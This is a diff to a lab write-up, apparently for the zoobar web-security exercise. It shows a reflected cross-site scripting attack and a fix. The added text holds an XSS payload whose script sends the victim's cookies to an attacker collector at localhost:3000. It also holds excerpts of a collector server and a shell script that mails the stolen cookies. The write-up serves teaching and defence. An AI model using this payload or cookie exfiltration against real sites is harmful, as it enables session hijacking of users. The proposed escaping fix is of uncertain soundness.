@@ -1,7 +1,7 @@
 # 3. Browser Protection
 ## 3.1. Remote Execution - Reflected Cross-site Scripting 
 
-The goal is to craft a URL that, when accessed, will cause the victim's browser to execute some JavaScript you as the attacker has supplied.
+The goal is to create a URL that, when accessed, will cause the victim's browser to execute some JavaScript you as the attacker has supplied.
 * When examining a URLs, there is one where the parameter is sent along with the URL, and then reflected back to the user view. 
 * The url is http://localhost:8080/zoobar/index.cgi/users?user=user_name
 * The user_name parameter is reflected back to the search box in the users page and its actually part of the value attribute of the input tag
@@ -27,9 +27,44 @@ The goal is to craft a URL that, when accessed, will cause the victim's browser 
 
 
 ## 3.2. Steal Cookies
+* creating different url from previous attack, this making sure that the victim won't notice the attack
+```html
+ <!-- original source -->
+<input type="text" name="user" value="{{ req_user }}" size=10></span><br>
+<!-- the final payload -->
+"size=10><script>fetch(`http://localhost:3000/cookie/${document.cookie}`)</script><input type="hidden
+```
+* creating **"send_mail.sh"** shell script that will send the cookies to my mail
+```shell
+#!/bin/bash 
+.
+echo "Cookie value is: $1" | mail -s "$SUBJECT" "$TO"
+.
+.
+```
 
-" size=10><script>fetch(`http://localhost:3000/cookie/${document.cookie}`)</script><input type="hidden
+* creating python server **"evil_server.py"** that will listen to the request and get the cookies as request parameter
+* the python server will execute the shell script and send the cookies to my mail
+```python
+.
+server = HTTPServer((host, port), RequestHandler)
+.
+.
+cookie = os.path.basename(path).replace('cookie/', '')
+.
+.
+output = subprocess.check_output(['sh', 'send_mail.sh', cookie])
+.
+.
+```
+## 3.3. Protect, Fix the XSS Vulnerability
 
+* To fix the vulnerability, we need to escape the user input before printing it to the page using request.form.get() function
+* this way, the input will be escaped and won't reflect directly to the page
+* the line that need to be changed is in the **"users.html"** file
+```html
+- <!--<input type="text" name="user" value="{{ req_user }}" size=10></span><br>-->
++ <input type="text" name="user" value="{{ request.form.get('user', '') }}" size=10></span><br>
+```
 
-## 3.3. Protect
 
